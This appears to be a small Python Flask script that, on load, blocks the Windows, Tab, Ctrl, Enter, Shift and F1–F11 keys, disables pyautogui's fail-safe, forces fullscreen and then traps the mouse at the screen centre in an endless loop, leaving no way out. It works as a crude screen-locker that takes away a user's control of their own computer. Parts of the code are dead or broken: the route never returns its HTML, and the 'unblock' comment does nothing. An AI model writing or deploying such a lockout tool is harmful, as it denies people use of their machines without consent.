from flask import Flask
import pyautogui
import keyboard

keyboard.block_key('Win')
keyboard.block_key('tab')
keyboard.block_key('ctrl')
keyboard.block_key('enter')
keyboard.block_key('shift')
keyboard.block_key('f1')
keyboard.block_key('f2')
keyboard.block_key('f3')
keyboard.block_key('f5')
keyboard.block_key('f4')
keyboard.block_key('f6')
keyboard.block_key('f7')
keyboard.block_key('f8')
keyboard.block_key('f9')
keyboard.block_key('f10')


pyautogui.FAILSAFE = False  # Disable the fail-safe mechanism
maxX, maxY = pyautogui.size()

app = Flask(__name__)

@app.route('/')
def freeze_input():
    # Move the mouse to the center of the screen
    keyboard.press_and_release('f11')
    keyboard.block_key('f11')

    
        
     
    html_response = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Mouse and Keyboard Frozen</title>
    </head>
    <body>
        <h1>Mouse and Keyboard Frozen</h1>
    </body>
    </html>
    """

    while True:
     pyautogui.moveTo(maxX/2, maxY/2)
    # Unblock the stop key
    html_response = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Mouse and Keyboard Frozen</title>
    </head>
    <body>
        <h1>Mouse and Keyboard Frozen</h1>
    </body>
    </html>
    """

  

if __name__ == '__main__':
   
    app.run(port=8001, host='localhost')
